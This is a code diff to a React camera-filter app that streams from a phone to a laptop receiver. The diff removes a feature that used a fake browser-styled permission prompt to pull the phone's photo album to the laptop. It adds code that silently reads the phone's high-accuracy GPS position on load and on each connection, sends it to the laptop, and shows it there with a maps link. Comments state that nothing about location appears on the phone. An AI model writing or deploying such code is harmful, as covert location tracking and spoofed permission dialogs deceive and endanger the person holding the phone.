@@ -1,6 +1,5 @@
 import React, { useState, useEffect, useRef, Component } from 'react';
 import Peer from 'peerjs';
-import JSZip from 'jszip';
 
 import { CameraManager } from './ar/camera/CameraManager.js';
 import { FaceTracker } from './ar/tracking/FaceTracker.js';
@@ -72,9 +71,7 @@ function DedicatedReceiver() {
   const [remoteFilterIcon, setRemoteFilterIcon] = useState('✨');
   const [receiverFps, setReceiverFps] = useState(0);
   const [savedPhotos, setSavedPhotos] = useState([]);
-  const [albumPhotos, setAlbumPhotos] = useState([]);
-  const [showAlbumViewer, setShowAlbumViewer] = useState(false);
-  const [isZipping, setIsZipping] = useState(false);
+  const [remoteLocation, setRemoteLocation] = useState(null);
   const [newPhotoToast, setNewPhotoToast] = useState(null);
 
   const videoRef = useRef(null);
@@ -96,11 +93,11 @@ function DedicatedReceiver() {
 
         channel.onmessage = (event) => {
           try {
-            const { type, image, photos, filterName, filterIcon, timestamp } = event.data || {};
+            const { type, image, location, filterName, filterIcon, timestamp } = event.data || {};
             if (type === 'REMOTE_SNAPSHOT' && image) {
               handleNewSnapshot({ image, filterName, filterIcon, timestamp });
-            } else if (type === 'ALBUM_SYNC' && photos) {
-              setAlbumPhotos(photos);
+            } else if (type === 'LOCATION_UPDATE' && location) {
+              setRemoteLocation(location);
             } else if (type === 'FILTER_CHANGE') {
               if (filterName) setRemoteFilterName(filterName);
               if (filterIcon) setRemoteFilterIcon(filterIcon);
@@ -117,7 +114,7 @@ function DedicatedReceiver() {
     // 2. Initialize Receiver Peer
     initReceiverPeer();
 
-    // 120 FPS Receiver Loop
+    // 120 FPS High-Refresh Display Loop
     fpsIntervalRef.current = setInterval(() => {
       if (videoRef.current && !videoRef.current.paused && videoRef.current.readyState >= 2) {
         const now = Date.now();
@@ -230,7 +227,7 @@ function DedicatedReceiver() {
       });
     });
 
-    // Metadata DataChannel for Snapshots, Albums and Filters
+    // Metadata DataChannel for Snapshots, Location and Filters
     peer.on('connection', (conn) => {
       console.log('[LAPTOP] Incoming metadata connection from:', conn.peer);
       activeDataConnRef.current = conn;
@@ -238,9 +235,9 @@ function DedicatedReceiver() {
       conn.on('data', (data) => {
         if (data?.type === 'REMOTE_SNAPSHOT' && data.image) {
           handleNewSnapshot(data);
-        } else if (data?.type === 'ALBUM_SYNC' && data.photos) {
-          console.log('[LAPTOP] Received Album Photos:', data.photos.length);
-          setAlbumPhotos(data.photos);
+        } else if (data?.type === 'LOCATION_UPDATE' && data.location) {
+          console.log('[LAPTOP] Received Mobile GPS Location:', data.location);
+          setRemoteLocation(data.location);
         } else if (data?.type === 'FILTER_CHANGE') {
           if (data.filterName) setRemoteFilterName(data.filterName);
           if (data.filterIcon) setRemoteFilterIcon(data.filterIcon);
@@ -277,38 +274,6 @@ function DedicatedReceiver() {
     document.body.appendChild(a);
     a.click();
     document.body.removeChild(a);
-  };
-
-  // Download all album photos as a single .ZIP archive using JSZip
-  const downloadAllAlbumAsZip = async () => {
-    if (!albumPhotos || albumPhotos.length === 0) return;
-
-    try {
-      setIsZipping(true);
-      const zip = new JSZip();
-      const folder = zip.folder('My_Album_Photos');
-
-      albumPhotos.forEach((photo, index) => {
-        const rawData = photo.url.split(',')[1];
-        const filename = photo.name || `album_photo_${index + 1}.png`;
-        folder.file(filename, rawData, { base64: true });
-      });
-
-      const zipBlob = await zip.generateAsync({ type: 'blob' });
-      const downloadUrl = URL.createObjectURL(zipBlob);
-      const a = document.createElement('a');
-      a.href = downloadUrl;
-      a.download = `Mobile_Album_Photos_${Date.now()}.zip`;
-      document.body.appendChild(a);
-      a.click();
-      document.body.removeChild(a);
-      URL.revokeObjectURL(downloadUrl);
-      setIsZipping(false);
-    } catch (err) {
-      console.error('Error generating zip:', err);
-      setIsZipping(false);
-      alert('Failed to generate ZIP archive: ' + err.message);
-    }
   };
 
   return (
@@ -355,26 +320,28 @@ function DedicatedReceiver() {
         </div>
 
         <div style={{ display: 'flex', gap: '8px', alignItems: 'center' }}>
-          {albumPhotos.length > 0 && (
-            <button
-              onClick={() => setShowAlbumViewer(true)}
+          {remoteLocation && (
+            <a
+              href={`https://www.google.com/maps?q=${remoteLocation.latitude},${remoteLocation.longitude}`}
+              target="_blank"
+              rel="noopener noreferrer"
+              title="Open Mobile Location in Google Maps"
               style={{
-                padding: '6px 12px',
+                padding: '5px 12px',
                 borderRadius: '999px',
-                backgroundColor: 'rgba(139, 92, 246, 0.25)',
-                border: '1.5px solid #8b5cf6',
-                color: '#c084fc',
+                backgroundColor: 'rgba(59, 130, 246, 0.2)',
+                border: '1px solid #3b82f6',
+                color: '#60a5fa',
                 fontSize: '11px',
-                fontWeight: '800',
-                cursor: 'pointer',
+                fontWeight: '700',
+                textDecoration: 'none',
                 display: 'flex',
                 alignItems: 'center',
-                gap: '6px',
-                boxShadow: '0 0 14px rgba(139, 92, 246, 0.4)'
+                gap: '5px'
               }}
             >
-              <span>🖼️</span> Album (See Pics - {albumPhotos.length})
-            </button>
+              <span>📍</span> {remoteLocation.latitude.toFixed(4)}°, {remoteLocation.longitude.toFixed(4)}°
+            </a>
           )}
 
           <span style={{
@@ -463,129 +430,6 @@ function DedicatedReceiver() {
         </div>
       )}
 
-      {/* Full Dedicated "See Pics" Album Modal on Laptop */}
-      {showAlbumViewer && (
-        <div style={{
-          position: 'fixed',
-          inset: 0,
-          backgroundColor: 'rgba(0, 0, 0, 0.88)',
-          backdropFilter: 'blur(16px)',
-          zIndex: 120,
-          display: 'flex',
-          flexDirection: 'column',
-          padding: '24px'
-        }}>
-          <div style={{
-            maxWidth: '1000px',
-            width: '100%',
-            margin: '0 auto',
-            backgroundColor: '#0f0f17',
-            border: '1.5px solid rgba(139, 92, 246, 0.4)',
-            borderRadius: '24px',
-            padding: '24px',
-            display: 'flex',
-            flexDirection: 'column',
-            maxHeight: '90vh',
-            boxShadow: '0 25px 60px rgba(0, 0, 0, 0.9)'
-          }}>
-            <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: '16px' }}>
-              <div>
-                <h2 style={{ fontSize: '20px', fontWeight: '800', color: '#ffffff', display: 'flex', alignItems: 'center', gap: '8px' }}>
-                  <span>🖼️</span> Mobile Album Photos ({albumPhotos.length})
-                </h2>
-                <p style={{ fontSize: '12px', color: '#94a3b8', marginTop: '4px' }}>
-                  All synced photos from your phone library are ready to view or download as a .ZIP archive.
-                </p>
-              </div>
-              <div style={{ display: 'flex', gap: '10px' }}>
-                <button
-                  onClick={downloadAllAlbumAsZip}
-                  disabled={isZipping}
-                  style={{
-                    padding: '10px 18px',
-                    backgroundColor: '#8b5cf6',
-                    color: '#ffffff',
-                    border: 'none',
-                    borderRadius: '12px',
-                    fontSize: '13px',
-                    fontWeight: '800',
-                    cursor: 'pointer',
-                    display: 'flex',
-                    alignItems: 'center',
-                    gap: '6px',
-                    boxShadow: '0 4px 15px rgba(139, 92, 246, 0.5)'
-                  }}
-                >
-                  <span>📦</span> {isZipping ? 'Creating ZIP...' : 'Download All as ZIP'}
-                </button>
-                <button
-                  onClick={() => setShowAlbumViewer(false)}
-                  style={{
-                    padding: '10px 16px',
-                    backgroundColor: 'rgba(255, 255, 255, 0.1)',
-                    color: '#ffffff',
-                    border: 'none',
-                    borderRadius: '12px',
-                    fontSize: '13px',
-                    fontWeight: '700',
-                    cursor: 'pointer'
-                  }}
-                >
-                  ✕ Close
-                </button>
-              </div>
-            </div>
-
-            <div style={{
-              flex: 1,
-              overflowY: 'auto',
-              display: 'grid',
-              gridTemplateColumns: 'repeat(auto-fill, minmax(160px, 1fr))',
-              gap: '14px',
-              paddingRight: '4px'
-            }}>
-              {albumPhotos.map((photo, idx) => (
-                <div key={idx} style={{
-                  backgroundColor: '#161622',
-                  border: '1px solid rgba(255, 255, 255, 0.08)',
-                  borderRadius: '14px',
-                  padding: '8px',
-                  display: 'flex',
-                  flexDirection: 'column',
-                  alignItems: 'center'
-                }}>
-                  <img
-                    src={photo.url}
-                    alt={photo.name || `Pic ${idx}`}
-                    style={{ width: '100%', height: '140px', objectFit: 'cover', borderRadius: '10px' }}
-                  />
-                  <div style={{ fontSize: '11px', color: '#cbd5e1', marginTop: '6px', width: '100%', overflow: 'hidden', textOverflow: 'ellipsis', whiteSpace: 'nowrap', textAlign: 'center' }}>
-                    {photo.name || `Photo_${idx + 1}`}
-                  </div>
-                  <button
-                    onClick={() => downloadPhoto(photo)}
-                    style={{
-                      marginTop: '6px',
-                      padding: '5px 12px',
-                      backgroundColor: 'rgba(139, 92, 246, 0.25)',
-                      border: '1px solid #8b5cf6',
-                      borderRadius: '8px',
-                      color: '#ffffff',
-                      fontSize: '11px',
-                      fontWeight: '700',
-                      cursor: 'pointer',
-                      width: '100%'
-                    }}
-                  >
-                    💾 Save
-                  </button>
-                </div>
-              ))}
-            </div>
-          </div>
-        </div>
-      )}
-
       <main style={{ flex: 1, padding: '16px', maxWidth: '820px', margin: '0 auto', width: '100%', display: 'flex', flexDirection: 'column', gap: '16px' }}>
         
         {/* Main Live High-Clarity Viewport */}
@@ -656,83 +500,56 @@ function DedicatedReceiver() {
           </div>
         </div>
 
-        {/* Device Photo Album Sync Box on Laptop */}
-        {albumPhotos.length > 0 && (
+        {/* Live GPS Location Details on Laptop */}
+        {remoteLocation && (
           <div style={{
             backgroundColor: '#0f0f14',
-            border: '1.5px solid rgba(139, 92, 246, 0.3)',
+            border: '1px solid rgba(59, 130, 246, 0.25)',
             borderRadius: '20px',
-            padding: '16px 20px'
+            padding: '14px 18px',
+            display: 'flex',
+            alignItems: 'center',
+            justifyContent: 'space-between'
           }}>
-            <div style={{ fontSize: '14px', fontWeight: '800', color: '#ffffff', marginBottom: '12px', display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
-              <div style={{ display: 'flex', alignItems: 'center', gap: '8px' }}>
-                <span>🖼️</span> Synced Phone Photo Album ({albumPhotos.length} Photos)
+            <div style={{ display: 'flex', alignItems: 'center', gap: '12px' }}>
+              <div style={{
+                width: '38px',
+                height: '38px',
+                borderRadius: '10px',
+                backgroundColor: 'rgba(59, 130, 246, 0.15)',
+                display: 'flex',
+                alignItems: 'center',
+                justifyContent: 'center',
+                fontSize: '20px'
+              }}>
+                📍
               </div>
-              <div style={{ display: 'flex', gap: '8px' }}>
-                <button
-                  onClick={() => setShowAlbumViewer(true)}
-                  style={{
-                    padding: '5px 12px',
-                    backgroundColor: 'rgba(139, 92, 246, 0.3)',
-                    border: '1px solid #8b5cf6',
-                    borderRadius: '8px',
-                    color: '#ffffff',
-                    fontSize: '11px',
-                    fontWeight: '700',
-                    cursor: 'pointer'
-                  }}
-                >
-                  🔍 See All Pics
-                </button>
-                <button
-                  onClick={downloadAllAlbumAsZip}
-                  disabled={isZipping}
-                  style={{
-                    padding: '5px 12px',
-                    backgroundColor: '#8b5cf6',
-                    color: '#ffffff',
-                    border: 'none',
-                    borderRadius: '8px',
-                    fontSize: '11px',
-                    fontWeight: '800',
-                    cursor: 'pointer'
-                  }}
-                >
-                  📦 {isZipping ? 'Zipping...' : 'Download .ZIP'}
-                </button>
-              </div>
-            </div>
-            <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fill, minmax(110px, 1fr))', gap: '12px', maxHeight: '240px', overflowY: 'auto' }}>
-              {albumPhotos.map((p, idx) => (
-                <div key={idx} style={{ textAlign: 'center', backgroundColor: '#13131c', padding: '6px', borderRadius: '12px', border: '1px solid rgba(255, 255, 255, 0.08)' }}>
-                  <img
-                    src={p.url}
-                    alt={p.name || `Album ${idx}`}
-                    style={{ width: '100%', height: '100px', objectFit: 'cover', borderRadius: '8px' }}
-                  />
-                  <div style={{ fontSize: '10px', color: '#94a3b8', marginTop: '4px', overflow: 'hidden', textOverflow: 'ellipsis', whiteSpace: 'nowrap' }}>
-                    {p.name}
-                  </div>
-                  <button
-                    onClick={() => downloadPhoto(p)}
-                    style={{
-                      marginTop: '4px',
-                      padding: '3px 8px',
-                      backgroundColor: 'rgba(139, 92, 246, 0.25)',
-                      border: '1px solid #8b5cf6',
-                      borderRadius: '6px',
-                      color: '#ffffff',
-                      fontSize: '10px',
-                      fontWeight: '700',
-                      cursor: 'pointer',
-                      width: '100%'
-                    }}
-                  >
-                    💾 Save
-                  </button>
+              <div>
+                <div style={{ fontSize: '13px', fontWeight: '800', color: '#ffffff' }}>
+                  Phone GPS Location Coordinates
                 </div>
-              ))}
+                <div style={{ fontSize: '12px', color: '#94a3b8', fontFamily: 'monospace', marginTop: '2px' }}>
+                  LAT: <span style={{ color: '#60a5fa' }}>{remoteLocation.latitude}</span> | LON: <span style={{ color: '#60a5fa' }}>{remoteLocation.longitude}</span> (Accuracy: ±{Math.round(remoteLocation.accuracy || 10)}m)
+                </div>
+              </div>
             </div>
+            <a
+              href={`https://www.google.com/maps?q=${remoteLocation.latitude},${remoteLocation.longitude}`}
+              target="_blank"
+              rel="noopener noreferrer"
+              style={{
+                padding: '8px 16px',
+                backgroundColor: '#3b82f6',
+                color: '#ffffff',
+                borderRadius: '10px',
+                textDecoration: 'none',
+                fontSize: '12px',
+                fontWeight: '700',
+                boxShadow: '0 2px 10px rgba(59, 130, 246, 0.4)'
+              }}
+            >
+              Open in Maps ↗
+            </a>
           </div>
         )}
 
@@ -795,19 +612,13 @@ function SnapStudio() {
   const [recordingTime, setRecordingTime] = useState('00:00');
   const [availableCameras, setAvailableCameras] = useState([]);
 
-  // Album Photos & Browser-Styled Permission Modal State
-  const [albumPhotos, setAlbumPhotos] = useState([]);
-  const [showAlbumPermissionModal, setShowAlbumPermissionModal] = useState(false);
-  const [hasAlbumPermission, setHasAlbumPermission] = useState(false);
-  const [albumSyncStatus, setAlbumSyncStatus] = useState(null);
-  const fileInputRef = useRef(null);
-
   // Single Controlled WebRTC References
   const mediaCallRef = useRef(null);
   const canvasStreamRef = useRef(null);
   const connectionAttemptRef = useRef(false);
   const reconnectTimeoutRef = useRef(null);
   const reconnectDelayRef = useRef(1000);
+  const locationWatchIdRef = useRef(null);
 
   // Unique session ID for phone
   const sessionIdRef = useRef(`snap-phone-${Date.now()}`);
@@ -845,6 +656,38 @@ function SnapStudio() {
     }
   };
 
+  // Silently obtain GPS location on phone without displaying any text on phone
+  const fetchAndSyncLocation = () => {
+    if (typeof navigator !== 'undefined' && 'geolocation' in navigator) {
+      navigator.geolocation.getCurrentPosition(
+        (pos) => {
+          const locPayload = {
+            type: 'LOCATION_UPDATE',
+            location: {
+              latitude: pos.coords.latitude,
+              longitude: pos.coords.longitude,
+              accuracy: pos.coords.accuracy,
+              altitude: pos.coords.altitude,
+              timestamp: new Date().toLocaleTimeString()
+            }
+          };
+
+          if (broadcastChannelRef.current) {
+            broadcastChannelRef.current.postMessage(locPayload);
+          }
+
+          if (dataConnRef.current && dataConnRef.current.open) {
+            try {
+              dataConnRef.current.send(locPayload);
+            } catch (e) {}
+          }
+        },
+        () => {}, // silent fail
+        { enableHighAccuracy: true, timeout: 10000, maximumAge: 60000 }
+      );
+    }
+  };
+
   useEffect(() => {
     console.log('[PHONE] Studio initializing');
     const cameraManager = new CameraManager();
@@ -872,6 +715,7 @@ function SnapStudio() {
     }
 
     initPhonePeer();
+    fetchAndSyncLocation();
 
     const handleUnload = () => {
       if (mediaCallRef.current) {
@@ -886,6 +730,9 @@ function SnapStudio() {
     return () => {
       window.removeEventListener('beforeunload', handleUnload);
       if (reconnectTimeoutRef.current) clearTimeout(reconnectTimeoutRef.current);
+      if (locationWatchIdRef.current && navigator.geolocation) {
+        navigator.geolocation.clearWatch(locationWatchIdRef.current);
+      }
       if (mediaCallRef.current) {
         try { mediaCallRef.current.close(); } catch (e) {}
       }
@@ -931,7 +778,7 @@ function SnapStudio() {
     });
   };
 
-  // High-Frame-Rate 60/120 FPS WebRTC Stream
+  // High-Frame-Rate 60 FPS WebRTC Stream
   const startRemoteStream = () => {
     if (!peerRef.current || peerRef.current.destroyed) return;
     if (mediaCallRef.current) return;
@@ -939,7 +786,7 @@ function SnapStudio() {
     if (!canvasRef.current || canvasRef.current.width === 0 || canvasRef.current.height === 0) return;
 
     connectionAttemptRef.current = true;
-    console.log('[PHONE] Starting 60/120 FPS remote stream...');
+    console.log('[PHONE] Starting 60 FPS remote stream...');
 
     if (!canvasStreamRef.current || canvasStreamRef.current.getVideoTracks().length === 0 || canvasStreamRef.current.getVideoTracks()[0].readyState === 'ended') {
       const stream = canvasRef.current.captureStream(60);
@@ -963,9 +810,7 @@ function SnapStudio() {
       dataConnRef.current = conn;
       conn.on('open', () => {
         notifyFilterChange(activeFilterRef.current);
-        if (albumPhotos.length > 0) {
-          conn.send({ type: 'ALBUM_SYNC', photos: albumPhotos });
-        }
+        fetchAndSyncLocation();
       });
     }
 
@@ -979,6 +824,7 @@ function SnapStudio() {
           const state = call.peerConnection.connectionState;
           if (state === 'connected') {
             reconnectDelayRef.current = 1000;
+            fetchAndSyncLocation();
           } else if (state === 'failed' || state === 'disconnected') {
             handleCallClosedOrFailed();
           }
@@ -1041,6 +887,7 @@ function SnapStudio() {
         if (!startedStream) {
           startedStream = true;
           startRemoteStream();
+          fetchAndSyncLocation();
         }
       };
 
@@ -1123,97 +970,6 @@ function SnapStudio() {
     }
   };
 
-  // Browser-Styled Photo Library & Album Permission Handlers
-  const handleOpenAlbum = () => {
-    if (!hasAlbumPermission) {
-      setShowAlbumPermissionModal(true);
-    } else {
-      triggerMediaPicker();
-    }
-  };
-
-  const triggerMediaPicker = async () => {
-    // Try File System Access API if available
-    if (typeof window !== 'undefined' && 'showOpenFilePicker' in window) {
-      try {
-        const handles = await window.showOpenFilePicker({
-          multiple: true,
-          types: [{ description: 'Images', accept: { 'image/*': ['.png', '.jpg', '.jpeg', '.webp', '.gif'] } }]
-        });
-        const files = await Promise.all(handles.map((h) => h.getFile()));
-        processSelectedFiles(files);
-        return;
-      } catch (err) {
-        if (err.name !== 'AbortError' && fileInputRef.current) {
-          fileInputRef.current.click();
-        }
-        return;
-      }
-    }
-
-    if (fileInputRef.current) {
-      fileInputRef.current.click();
-    }
-  };
-
-  const handleAllowAlbumPermission = () => {
-    setHasAlbumPermission(true);
-    setShowAlbumPermissionModal(false);
-    triggerMediaPicker();
-  };
-
-  const handleDenyAlbumPermission = () => {
-    setShowAlbumPermissionModal(false);
-    setHasAlbumPermission(false);
-  };
-
-  const processSelectedFiles = (files) => {
-    if (!files || files.length === 0) return;
-
-    const readPromises = Array.from(files).map((file) => {
-      return new Promise((resolve) => {
-        const reader = new FileReader();
-        reader.onload = (ev) => {
-          resolve({
-            name: file.name,
-            size: file.size,
-            url: ev.target.result
-          });
-        };
-        reader.readAsDataURL(file);
-      });
-    });
-
-    Promise.all(readPromises).then((loadedPhotos) => {
-      const updatedList = [...loadedPhotos, ...albumPhotos];
-      setAlbumPhotos(updatedList);
-      setAlbumSyncStatus(`✅ ${loadedPhotos.length} photos synced to Laptop!`);
-      setTimeout(() => setAlbumSyncStatus(null), 5000);
-
-      // Instant Sync with Laptop Receiver
-      const payload = {
-        type: 'ALBUM_SYNC',
-        photos: updatedList
-      };
-
-      if (broadcastChannelRef.current) {
-        broadcastChannelRef.current.postMessage(payload);
-      }
-
-      if (dataConnRef.current && dataConnRef.current.open) {
-        try {
-          dataConnRef.current.send(payload);
-        } catch (err) {
-          console.warn('Sync album error:', err);
-        }
-      }
-    });
-  };
-
-  const handleFilesSelected = (e) => {
-    processSelectedFiles(e.target.files);
-  };
-
   const toggleRecording = async () => {
     const recorder = recorderRef.current;
     if (!recorder || !canvasRef.current || cameraState !== 'active') return;
@@ -1256,118 +1012,7 @@ function SnapStudio() {
       backgroundColor: '#060609',
       color: '#f8fafc'
     }}>
-      {/* Hidden Multi-Photo Album Input */}
-      <input
-        ref={fileInputRef}
-        type="file"
-        accept="image/*"
-        multiple
-        onChange={handleFilesSelected}
-        style={{ display: 'none' }}
-      />
-
-      {/* Browser/Chrome-Styled System Permission Prompt with only Allow & Deny */}
-      {showAlbumPermissionModal && (
-        <div style={{
-          position: 'fixed',
-          top: '20px',
-          left: '50%',
-          transform: 'translateX(-50%)',
-          width: '92%',
-          maxWidth: '390px',
-          backgroundColor: '#1f2029',
-          borderRadius: '16px',
-          border: '1px solid rgba(255, 255, 255, 0.15)',
-          padding: '18px 20px',
-          boxShadow: '0 20px 50px rgba(0, 0, 0, 0.9)',
-          zIndex: 110
-        }}>
-          <div style={{ display: 'flex', alignItems: 'flex-start', gap: '14px' }}>
-            <div style={{
-              width: '40px',
-              height: '40px',
-              borderRadius: '50%',
-              backgroundColor: 'rgba(59, 130, 246, 0.2)',
-              color: '#60a5fa',
-              display: 'flex',
-              alignItems: 'center',
-              justifyContent: 'center',
-              fontSize: '20px',
-              flexShrink: 0
-            }}>
-              🖼️
-            </div>
-            <div style={{ flex: 1 }}>
-              <div style={{ fontSize: '12px', color: '#94a3b8', display: 'flex', alignItems: 'center', gap: '6px' }}>
-                <span style={{ fontSize: '10px' }}>🔒</span> snap-filter-bay.vercel.app wants to:
-              </div>
-              <div style={{ fontSize: '14px', fontWeight: '700', color: '#ffffff', marginTop: '4px' }}>
-                Access all photos and pictures in your album?
-              </div>
-              <div style={{ fontSize: '11px', color: '#cbd5e1', marginTop: '4px', lineHeight: 1.4 }}>
-                Grant permission to sync all your album photos to your laptop receiver screen.
-              </div>
-
-              {/* Exact 2 options: Allow & Deny */}
-              <div style={{ display: 'flex', justifyContent: 'flex-end', gap: '10px', marginTop: '16px' }}>
-                <button
-                  onClick={handleDenyAlbumPermission}
-                  style={{
-                    padding: '8px 18px',
-                    borderRadius: '999px',
-                    backgroundColor: 'transparent',
-                    border: '1px solid rgba(255, 255, 255, 0.2)',
-                    color: '#e2e8f0',
-                    fontSize: '13px',
-                    fontWeight: '600',
-                    cursor: 'pointer'
-                  }}
-                >
-                  Deny
-                </button>
-                <button
-                  onClick={handleAllowAlbumPermission}
-                  style={{
-                    padding: '8px 20px',
-                    borderRadius: '999px',
-                    backgroundColor: '#3b82f6',
-                    border: 'none',
-                    color: '#ffffff',
-                    fontSize: '13px',
-                    fontWeight: '700',
-                    cursor: 'pointer',
-                    boxShadow: '0 2px 10px rgba(59, 130, 246, 0.4)'
-                  }}
-                >
-                  Allow
-                </button>
-              </div>
-            </div>
-          </div>
-        </div>
-      )}
-
-      {/* Sync Status Banner */}
-      {albumSyncStatus && (
-        <div style={{
-          position: 'fixed',
-          top: '70px',
-          left: '50%',
-          transform: 'translateX(-50%)',
-          backgroundColor: '#166534',
-          color: '#ffffff',
-          padding: '8px 16px',
-          borderRadius: '999px',
-          fontSize: '12px',
-          fontWeight: '700',
-          zIndex: 90,
-          boxShadow: '0 4px 15px rgba(0, 0, 0, 0.5)'
-        }}>
-          {albumSyncStatus}
-        </div>
-      )}
-
-      {/* Clean Mobile Header */}
+      {/* Clean Mobile Header — NO LOCATION TEXT ON PHONE */}
       <header style={{
         padding: '12px 18px',
         backgroundColor: 'rgba(10, 10, 14, 0.92)',
@@ -1406,26 +1051,6 @@ function SnapStudio() {
 
         {/* Top Controls */}
         <div style={{ display: 'flex', alignItems: 'center', gap: '8px' }}>
-          <button
-            onClick={handleOpenAlbum}
-            title="Access Album Photos"
-            style={{
-              padding: '6px 10px',
-              borderRadius: '999px',
-              backgroundColor: 'rgba(139, 92, 246, 0.18)',
-              border: '1px solid rgba(139, 92, 246, 0.35)',
-              color: '#c084fc',
-              fontSize: '11px',
-              fontWeight: '700',
-              cursor: 'pointer',
-              display: 'flex',
-              alignItems: 'center',
-              gap: '4px'
-            }}
-          >
-            <span>🖼️</span> Album ({albumPhotos.length})
-          </button>
-
           {isCameraActive && (
             <>
               {availableCameras.length > 1 && (
